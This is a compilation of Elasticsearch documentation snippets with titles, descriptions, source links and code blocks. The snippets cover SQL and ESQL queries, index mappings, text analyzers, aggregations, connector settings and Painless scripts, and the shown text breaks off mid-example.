https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-select.md#2025-04-21_snippet_31\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM (SELECT languages, gender, salary FROM test_emp) PIVOT (AVG(salary) FOR gender IN ('F'));\n```\n\n----------------------------------------\n\nTITLE: Defining Custom Headers for GraphQL Requests\nDESCRIPTION: This JSON object example shows how to specify custom headers to be sent with each GraphQL request in the connector's configuration.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-graphql.md#2025-04-21_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\n{\n    \"content-type\": \"Application/json\"\n}\n```\n\n----------------------------------------\n\nTITLE: ESQL Function Comment Block\nDESCRIPTION: Auto-generated comment block for ESQL function documentation, indicating the code is machine generated and shouldn't be manually edited. The function creates value groups (buckets) from datetime/numeric inputs with configurable bucket sizes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/bucket.md#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: Creating Documents Without Refresh in Elasticsearch\nDESCRIPTION: Examples of creating documents without forcing a refresh, either by omitting the refresh parameter or explicitly setting it to false. Changes will be visible after the next automatic refresh.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/refresh-parameter.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT /test/_doc/3\n{\"test\": \"test\"}\nPUT /test/_doc/4?refresh=false\n{\"test\": \"test\"}\n```\n\n----------------------------------------\n\nTITLE: Implementing Galician Analyzer in Elasticsearch\nDESCRIPTION: Custom implementation of the built-in Galician analyzer with Galician stopwords, keyword marker for exclusions from stemming, and Galician stemming.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-lang-analyzer.md#2025-04-21_snippet_15\n\nLANGUAGE: console\nCODE:\n```\nPUT /galician_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"filter\": {\n        \"galician_stop\": {\n          \"type\":       \"stop\",\n          \"stopwords\":  \"_galician_\" <1>\n        },\n        \"galician_keywords\": {\n          \"type\":       \"keyword_marker\",\n          \"keywords\":   [\"exemplo\"] <2>\n        },\n        \"galician_stemmer\": {\n          \"type\":       \"stemmer\",\n          \"language\":   \"galician\"\n        }\n      },\n      \"analyzer\": {\n        \"rebuilt_galician\": {\n          \"tokenizer\":  \"standard\",\n          \"filter\": [\n            \"lowercase\",\n            \"galician_stop\",\n            \"galician_keywords\",\n            \"galician_stemmer\"\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Advanced Sync Rules in Elasticsearch JavaScript\nDESCRIPTION: This JavaScript snippet shows an advanced sync rule setup for indexing files directly inside a root folder, excluding certain file types. It ensures the indexing follows the specified path pattern while skipping designated extensions. JSON must be correctly structured to function as intended.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-onedrive.md#2025-04-21_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\n[\n  {\n    \"skipFilesWithExtensions\": [\".md\"],\n    \"parentPathPattern\": \"/drive/root:\"\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: Running End-to-End Tests - Shell\nDESCRIPTION: These Shell commands illustrate how to run end-to-end tests for the PostgreSQL connector using `make`. The `NAME` parameter specifies the connector, while `DATA_SIZE=small` optionally accelerates the test by using smaller data samples.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-postgresql.md#2025-04-21_snippet_8\n\nLANGUAGE: Shell\nCODE:\n```\n$ make ftest NAME=postgresql\n```\n\nLANGUAGE: Shell\nCODE:\n```\nmake ftest NAME=postgresql DATA_SIZE=small\n```\n\n----------------------------------------\n\nTITLE: Extracting Remainder of String with SUBSTRING in ESQL\nDESCRIPTION: This example demonstrates using the SUBSTRING function with an omitted length parameter, which returns all characters from the starting position to the end of the string. It extracts all characters except the first one from each last_name.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/substring.md#2025-04-21_snippet_2\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| KEEP last_name\n| EVAL ln_sub = SUBSTRING(last_name, 2)\n```\n\n----------------------------------------\n\nTITLE: Using ENDS_WITH Function in ESQL Query\nDESCRIPTION: Example showing how to use ENDS_WITH function to check if last names end with the letter 'd'. The query keeps only the last_name column and evaluates a boolean condition using ENDS_WITH function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/ends_with.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| KEEP last_name\n| EVAL ln_E = ENDS_WITH(last_name, \"d\")\n```\n\n----------------------------------------\n\nTITLE: Disabling Eager Global Ordinals in Elasticsearch Mapping\nDESCRIPTION: This snippet demonstrates how to disable eager global ordinals on a field by setting the 'eager_global_ordinals' property to false. This reverts to the default behavior where global ordinals are loaded on-demand during search operations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/eager-global-ordinals.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\nPUT my-index-000001/_mapping\n{\n  \"properties\": {\n    \"tags\": {\n      \"type\": \"keyword\",\n      \"eager_global_ordinals\": false\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Semantic Text Field with Custom Inference Endpoint\nDESCRIPTION: Example of creating an index with a semantic_text field using a custom inference endpoint specified by inference_id.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/semantic-text.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000002\n{\n  \"mappings\": {\n    \"properties\": {\n      \"inference_field\": {\n        \"type\": \"semantic_text\",\n        \"inference_id\": \"my-openai-endpoint\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Transport Authentication in Elasticsearch\nDESCRIPTION: YAML configuration for securing the Elasticsearch transport layer. This setup configures the authentication type for node-to-node communication using client certificates (PKI).\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/watcher/licenses/failureaccess-NOTICE.txt#2025-04-21_snippet_11\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.transport.authentication.type: pki\n```\n\n----------------------------------------\n\nTITLE: Quoting Reserved Keywords as Identifiers in Elasticsearch SQL\nDESCRIPTION: Shows how to use SQL reserved keywords as identifiers by enclosing them in double quotes, allowing them to be used as column or table names.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-lexical-structure.md#2025-04-21_snippet_3\n\nLANGUAGE: sql\nCODE:\n```\nSELECT \"from\" FROM \"<logstash-{now/d}>\"\n```\n\n----------------------------------------\n\nTITLE: Multiple Lookup Joins in ESQL\nDESCRIPTION: Demonstrates sequential LOOKUP JOIN operations to combine data from system_metrics, host_inventory, and ownerships tables using host.name as the common join key. This is a generated test case for validating join functionality.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/docs-lookup-join.csv-spec/lookupJoinHostNameTwice.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM system_metrics\n| LOOKUP JOIN host_inventory ON host.name\n| LOOKUP JOIN ownerships ON host.name\n```\n\n----------------------------------------\n\nTITLE: Creating Index with Join Field in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to create an Elasticsearch index with a `join` field mapping to establish a parent-child relationship between documents. The `my-join-field` is defined with the `parent` and `child` relations, which is a prerequisite for using the `has_child` query. This index setup is necessary for the query to correctly identify and retrieve parent documents based on their child documents.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-has-child-query.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"my-join-field\": {\n        \"type\": \"join\",\n        \"relations\": {\n          \"parent\": \"child\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Metric Aggregation Combine Context Variables and Return Types\nDESCRIPTION: Defines the available variables and return types for Painless combine scripts in metric aggregations. Scripts have access to read-only params Map for user parameters and state Map containing values from previous map script. Scripts must return a value that can be used in a subsequent reduce script or as final result.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-metric-agg-combine-context.md#2025-04-21_snippet_0\n\nLANGUAGE: painless\nCODE:\n```\n// Available variables:\nparams  // Map (read-only) - User-defined parameters from query\nstate   // Map - Values from prior map script\n\n// Valid return types:\n// - List\n// - Map \n// - String\n// - primitive\n```\n\n----------------------------------------\n\nTITLE: EQL Divide Function Examples\nDESCRIPTION: Examples demonstrating the divide function usage with different numeric inputs and null handling. Shows integer vs float division behavior.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-function-ref.md#2025-04-21_snippet_4\n\nLANGUAGE: eql\nCODE:\n```\ndivide(4, 2)                                            // returns 2\ndivide(4, 3)                                            // returns 1\ndivide(4, 3.0)                                          // returns 1.333...\ndivide(4, 0.5)                                          // returns 8\ndivide(0.5, 4)                                          // returns 0.125\ndivide(0.5, 0.25)                                       // returns 2.0\ndivide(4, -2)                                           // returns -2\ndivide(-4, -2)                                          // returns 2\n\n// process.args_count = 4\ndivide(process.args_count, 2)                           // returns 2\ndivide(process.args_count, 3)                           // returns 1\ndivide(process.args_count, 3.0)                         // returns 1.333...\ndivide(12, process.args_count)                          // returns 3\ndivide(process.args_count, 0.5)                         // returns 8\ndivide(0.5, process.args_count)                         // returns 0.125\n\n// process.parent.args_count = 2\ndivide(process.args_count, process.parent.args_count)   // returns 2\n\n// null handling\ndivide(null, 4)                                         // returns null\ndivide(4, null)                                         // returns null\ndivide(null, process.args_count)                        // returns null\ndivide(process.args_count, null)                        // returns null\n```\n\n----------------------------------------\n\nTITLE: Indexing Sample Documents for Scripted Metric Aggregation\nDESCRIPTION: This snippet shows how to index sample documents into an Elasticsearch index for testing the scripted metric aggregation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-scripted-metric-aggregation.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPUT /transactions/_bulk?refresh\n{\"index\":{\"_id\":1}}\n{\"type\": \"sale\",\"amount\": 80}\n{\"index\":{\"_id\":2}}\n{\"type\": \"cost\",\"amount\": 10}\n{\"index\":{\"_id\":3}}\n{\"type\": \"cost\",\"amount\": 30}\n{\"index\":{\"_id\":4}}\n{\"type\": \"sale\",\"amount\": 130}\n```\n\n----------------------------------------\n\nTITLE: Indexing GeoJSON GeometryCollection in Elasticsearch\nDESCRIPTION: Example of indexing a GeoJSON GeometryCollection in Elasticsearch. GeometryCollection contains an array of geometry objects of different types, in this case a Point and a LineString.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/geo-shape.md#2025-04-21_snippet_16\n\nLANGUAGE: json\nCODE:\n```\nPOST /example/_doc\n{\n  \"location\" : {\n    \"type\": \"GeometryCollection\",\n    \"geometries\": [\n      {\n        \"type\": \"Point\",\n        \"coordinates\": [100.0, 0.0]\n      },\n      {\n        \"type\": \"LineString\",\n        \"coordinates\": [ [101.0, 0.0], [102.0, 1.0] ]\n      }\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Advanced Sync Rules in Elasticsearch JavaScript\nDESCRIPTION: This JavaScript snippet demonstrates how to define advanced sync rules for an Elasticsearch connector. The JSON structure allows skipping files with specific extensions, indexing based on ownership, or directory criteria. These rules require a full sync to take effect. Ensure that the proper JSON syntax is used and dependencies are correctly configured.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-onedrive.md#2025-04-21_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\n[\n  {\n    \"skipFilesWithExtensions\": [\".xlsx\", \".docx\"]\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: Using Index Boost with Aliases and Patterns in Elasticsearch\nDESCRIPTION: This snippet shows how to apply index boosting to an alias and an index pattern. It applies a boost of 1.4 to the alias 'my-alias' and 1.3 to any indices matching the pattern 'my-index*'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-multiple-data-streams-indices.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"indices_boost\": [\n    { \"my-alias\":  1.4 },\n    { \"my-index*\": 1.3 }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: GROUP BY with Column Ordinal\nDESCRIPTION: Example of grouping results using a column's ordinal position rather than its name, which references the first column in the SELECT list.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-select.md#2025-04-21_snippet_12\n\nLANGUAGE: sql\nCODE:\n```\nSELECT gender FROM emp GROUP BY 1;\n```\n\n----------------------------------------\n\nTITLE: SQL DESCRIBE TABLE Syntax Definition\nDESCRIPTION: Defines the syntax structure for the DESCRIBE TABLE command. Supports optional catalog identifier, frozen indices inclusion, and table identifiers with pattern matching.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-describe-table.md#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nDESCRIBE | DESC\n    [CATALOG identifier]? <1>\n    [INCLUDE FROZEN]?     <2>\n    [table_identifier |   <3>\n     LIKE pattern]        <4>\n```\n\n----------------------------------------\n\nTITLE: SHOW TABLES with Single Character Pattern\nDESCRIPTION: Illustrates single character pattern matching using underscore wildcard.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-show-tables.md#2025-04-21_snippet_5\n\nLANGUAGE: sql\nCODE:\n```\nSHOW TABLES LIKE 'em_';\n```\n\n----------------------------------------\n\nTITLE: Setting index-wide ignore_above in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to configure the index.mapping.ignore_above setting when creating a new index. It sets a maximum string length of 256 characters for all applicable fields in the index.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/index-mapping-ignore-above.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"settings\": {\n    \"index.mapping.ignore_above\": 256\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Negation Operator in Elasticsearch SQL\nDESCRIPTION: Illustrates the use of unary minus (-) operator to negate a numeric value\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-operators-math.md#2025-04-21_snippet_2\n\nLANGUAGE: sql\nCODE:\n```\nSELECT - 1 AS x;\n```\n\n----------------------------------------\n\nTITLE: Setting Up Mapping for kNN in Elasticsearch\nDESCRIPTION: This code snippet demonstrates how to set up an index with a dense_vector field for enabling kNN search. It shows the mapping configuration with a similarity metric specified. Dependencies include Elasticsearch with kNN plugin enabled. Inputs are the field configurations and outputs are the mappings being applied to the index.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-knn-query.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-image-index\n{\n  \"mappings\": {\n    \"properties\": {\n       \"image-vector\": {\n        \"type\": \"dense_vector\",\n        \"dims\": 3,\n        \"index\": true,\n        \"similarity\": \"l2_norm\"\n      },\n      \"file-type\": {\n        \"type\": \"keyword\"\n      },\n      \"title\": {\n        \"type\": \"text\"\n      }\n    }\n  }\n}\n\n```\n\n----------------------------------------\n\nTITLE: Customizing Shingle Size in Elasticsearch Analysis\nDESCRIPTION: This snippet shows how to customize the shingle filter to produce 2-3 word shingles using the min_shingle_size and max_shingle_size parameters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-shingle-tokenfilter.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET /_analyze\n{\n  \"tokenizer\": \"whitespace\",\n  \"filter\": [\n    {\n      \"type\": \"shingle\",\n      \"min_shingle_size\": 2,\n      \"max_shingle_size\": 3\n    }\n  ],\n  \"text\": \"quick brown fox jumps\"\n}\n```\n\n----------------------------------------\n\nTITLE: minimum_should_match with Cross-field Search Type\nDESCRIPTION: Demonstrates using minimum_should_match with the cross_fields search type. This groups fields with the same analyzer together during analysis, creating per-term blended queries.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-query-string-query.md#2025-04-21_snippet_22\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"query_string\": {\n      \"fields\": [\n        \"title\",\n        \"content\"\n      ],\n      \"query\": \"this OR that OR thus\",\n      \"type\": \"cross_fields\",\n      \"minimum_should_match\": 2\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Russian Stop Words\nDESCRIPTION: Defines Russian stop words used in Elasticsearch analysis, providing a reference link to the Lucene source.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-stop-tokenfilter.md#2025-04-21_snippet_33\n\nLANGUAGE: markdown\nCODE:\n```\n`_russian_`\n:   [Russian stop words](https://github.com/apache/lucene/blob/main/lucene/analysis/common/src/resources/org/apache/lucene/analysis/snowball/russian_stop.txt)\n```\n\n----------------------------------------\n\nTITLE: Stop Analyzer in Elasticsearch\nDESCRIPTION: Similar to simple analyzer with additional support for removing stop words.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analyzer-reference.md#2025-04-21_snippet_3\n\nLANGUAGE: elasticsearch\nCODE:\n```\n\"analyzer\": \"stop\"\n```\n\n----------------------------------------\n\nTITLE: Connector Configuration (Non-Dockerized)\nDESCRIPTION: This YAML configuration snippet shows how to configure the self-managed connector to use the data extraction service.  It specifies the host, enables file pointers, and defines the shared volume directory. The `host` should point to the extraction service's endpoint.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-content-extraction.md#2025-04-21_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\n# data-extraction-service settings\nextraction_service:\n  host: http://localhost:8090\n  use_file_pointers: true\n  shared_volume_dir: '/app/files'\n```\n\n----------------------------------------\n\nTITLE: Running Elasticsearch ODBC Test Suite for Data Import\nDESCRIPTION: Command to run the Python-based ODBC test suite that will download TDVT datasets and upload them to Elasticsearch. Requires a Python 3 installation with requests and psutils modules.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/connectors/tableau/tdvt/README.md#2025-04-21_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\npython3 ./test/integration/ites.py -p http://user:password@host:port -tx\n```\n\n----------------------------------------\n\nTITLE: Defining IntervalYearMonth Class for SQL Scripting in Java\nDESCRIPTION: This snippet defines the IntervalYearMonth class from the org.elasticsearch.xpack.sql.expression.literal.interval package for use in SQL scripting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/src/main/resources/org/elasticsearch/xpack/sql/plugin/sql_whitelist.txt#2025-04-21_snippet_2\n\nLANGUAGE: java\nCODE:\n```\nclass org.elasticsearch.xpack.sql.expression.literal.interval.IntervalYearMonth {\n}\n```\n\n----------------------------------------\n\nTITLE: Creating an Index with Semantic Text Field Using Multi-fields in Elasticsearch\nDESCRIPTION: This snippet shows how to create an index using the semantic_text field type as part of a multi-fields structure. It uses the same .elser-2-elasticsearch inference model as the previous example.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/semantic-text.md#2025-04-21_snippet_6\n\nLANGUAGE: console\nCODE:\n```\nPUT test-index\n{\n    \"mappings\": {\n        \"properties\": {\n            \"source_field\": {\n                \"type\": \"text\",\n                \"fields\": {\n                    \"infer_field\": {\n                        \"type\": \"semantic_text\",\n                        \"inference_id\": \".elser-2-elasticsearch\"\n                    }\n                }\n            }\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Email Analysis Example - Sample Email\nDESCRIPTION: Example email address for pattern capture demonstration\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-pattern-capture-tokenfilter.md#2025-04-21_snippet_5\n\nLANGUAGE: text\nCODE:\n```\njohn-smith_123@foo-bar.com\n```\n\n----------------------------------------\n\nTITLE: IP CIDR Match Function Definition in SQL for Elasticsearch\nDESCRIPTION: This SQL function definition checks if a given IP address is contained within one or more specified CIDR blocks. It takes an IP address and a list of CIDR blocks as input and returns a boolean result.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/cidr_match.md#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Description**\n\nReturns true if the provided IP is contained in one of the provided CIDR blocks.\n```\n\n----------------------------------------\n\nTITLE: Russian Custom Analyzer Implementation\nDESCRIPTION: Details the reimplementation of the Russian analyzer with stop words, keyword marking, and stemming capabilities.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-lang-analyzer.md#2025-04-21_snippet_24\n\nLANGUAGE: console\nCODE:\n```\nPUT /russian_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"filter\": {\n        \"russian_stop\": {\n          \"type\":       \"stop\",\n          \"stopwords\":  \"_russian_\"\n        },\n        \"russian_keywords\": {\n          \"type\":       \"keyword_marker\",\n          \"keywords\":   [\"пример\"]\n        },\n        \"russian_stemmer\": {\n          \"type\":       \"stemmer\",\n          \"language\":   \"russian\"\n        }\n      },\n      \"analyzer\": {\n        \"rebuilt_russian\": {\n          \"tokenizer\":  \"standard\",\n          \"filter\": [\n            \"lowercase\",\n            \"russian_stop\",\n            \"russian_keywords\",\n            \"russian_stemmer\"\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: ESQL Coordinate Type Combinations Table\nDESCRIPTION: Markdown table showing valid input type combinations for y_coordinate and x_coordinate parameters, along with their resulting output type. All combinations result in double type output.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/atan2.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| y_coordinate | x_coordinate | result |\n| --- | --- | --- |\n| double | double | double |\n| double | integer | double |\n| double | long | double |\n| double | unsigned_long | double |\n| integer | double | double |\n| integer | integer | double |\n| integer | long | double |\n| integer | unsigned_long | double |\n| long | double | double |\n| long | integer | double |\n| long | long | double |\n| long | unsigned_long | double |\n| unsigned_long | double | double |\n| unsigned_long | integer | double |\n| unsigned_long | long | double |\n| unsigned_long | unsigned_long | double |\n```\n\n----------------------------------------\n\nTITLE: Executing Geo-Point Field Script for Coordinate Retrieval\nDESCRIPTION: This script uses the geo_point_field context to retrieve latitude and longitude values and emit them as a geo-point. It demonstrates how to work with geographic coordinates in Painless scripts.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-api-examples.md#2025-04-21_snippet_13\n\nLANGUAGE: console\nCODE:\n```\nPOST /_scripts/painless/_execute\n{\n  \"script\": {\n    \"source\": \"\"\"\n      emit(doc['lat'].value, doc['lon'].value);\n    \"\"\"\n  },\n  \"context\": \"geo_point_field\",\n  \"context_setup\": {\n    \"index\": \"my-index-000001\",\n    \"document\": {\n      \"lat\": 41.12,\n      \"lon\": -71.34\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Holt-Winters Triple Exponential Implementation\nDESCRIPTION: Triple exponential smoothing incorporating level, trend, and seasonality components with configurable parameters for each decay value and seasonality period.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-movfn-aggregation.md#2025-04-21_snippet_11\n\nLANGUAGE: json\nCODE:\n```\nPOST /_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"my_date_histo\": {\n      \"date_histogram\": {\n        \"field\": \"date\",\n        \"calendar_interval\": \"1M\"\n      },\n      \"aggs\": {\n        \"the_sum\": {\n          \"sum\": { \"field\": \"price\" }\n        },\n        \"the_movavg\": {\n          \"moving_fn\": {\n            \"buckets_path\": \"the_sum\",\n            \"window\": 10,\n            \"script\": \"if (values.length > 5*2) {MovingFunctions.holtWinters(values, 0.3, 0.1, 0.1, 5, false)}\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Including NOW Function Examples in ESQL Documentation\nDESCRIPTION: This snippet includes examples of using the NOW function from an external markdown file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/now.md#2025-04-21_snippet_4\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../examples/now.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Using MV_MIN Function with Keyword Arrays in ESQL\nDESCRIPTION: This snippet shows how MV_MIN works with keyword (string) arrays. It compares strings based on their UTF-8 representation byte by byte and returns the one that sorts first lexicographically.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/mv_min.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nROW a=[\"foo\", \"bar\"]\n| EVAL min_a = MV_MIN(a)\n```\n\n----------------------------------------\n\nTITLE: Min Bucket Aggregation Example with Sales Data\nDESCRIPTION: Demonstrates how to use min_bucket aggregation to find minimum monthly sales using date histogram and sum aggregations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-min-bucket-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"sales_per_month\": {\n      \"date_histogram\": {\n        \"field\": \"date\",\n        \"calendar_interval\": \"month\"\n      },\n      \"aggs\": {\n        \"sales\": {\n          \"sum\": {\n            \"field\": \"price\"\n          }\n        }\n      }\n    },\n    \"min_monthly_sales\": {\n      \"min_bucket\": {\n        \"buckets_path\": \"sales_per_month>sales\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Remote Cluster Server in Elasticsearch YAML\nDESCRIPTION: YAML configuration for enabling and setting up the remote cluster server in Elasticsearch. This includes settings for enabling the server, specifying host addresses, and configuring TCP options.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/networking-settings.md#2025-04-21_snippet_10\n\nLANGUAGE: yaml\nCODE:\n```\nremote_cluster_server.enabled: true\nremote_cluster.host: \"192.168.1.1\"\nremote_cluster.bind_host: \"192.168.1.1\"\nremote_cluster.publish_host: \"192.168.1.1\"\nremote_cluster.publish_port: 9400\nremote_cluster.tcp.keep_alive: true\nremote_cluster.tcp.keep_idle: 300\nremote_cluster.tcp.keep_interval: 60\nremote_cluster.tcp.keep_count: 5\nremote_cluster.tcp.no_delay: true\nremote_cluster.tcp.reuse_address: true\nremote_cluster.tcp.send_buffer_size: 64mb\nremote_cluster.tcp.receive_buffer_size: 64mb\n```\n\n----------------------------------------\n\nTITLE: Output of Thai Tokenizer in Elasticsearch\nDESCRIPTION: This snippet shows the expected output from the Thai tokenizer when processing the sample Thai text. It demonstrates how the tokenizer segments the input into individual Thai words.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-thai-tokenizer.md#2025-04-21_snippet_1\n\nLANGUAGE: text\nCODE:\n```\n[ การ, ที่, ได้, ต้อง, แสดง, ว่า, งาน, ดี ]\n```\n\n----------------------------------------\n\nTITLE: Expressions Over Aggregates with GROUP BY\nDESCRIPTION: Example of applying the ROUND function to the MIN aggregate function with salary data, grouped by gender.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-select.md#2025-04-21_snippet_17\n\nLANGUAGE: sql\nCODE:\n```\nSELECT gender AS g, ROUND((MIN(salary) / 100)) AS salary FROM emp GROUP BY gender;\n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with Default N-gram Tokenizer in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to use the default N-gram tokenizer to analyze text in Elasticsearch. It shows the API call and the resulting tokens produced.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-ngram-tokenizer.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\nPOST _analyze\n{\n  \"tokenizer\": \"ngram\",\n  \"text\": \"Quick Fox\"\n}\n```\n\nLANGUAGE: text\nCODE:\n```\n[ Q, Qu, u, ui, i, ic, c, ck, k, \"k \", \" \", \" F\", F, Fo, o, ox, x ]\n```\n\n----------------------------------------\n\nTITLE: Querying a Date Range Field with Range Query in Elasticsearch\nDESCRIPTION: Example showing how to use a range query with the 'within' relation on a date_range field named 'time_frame'. The query uses the relation parameter which can be WITHIN, CONTAINS, or INTERSECTS (default).\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/range.md#2025-04-22_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nGET range_index/_search\n{\n  \"query\" : {\n    \"range\" : {\n      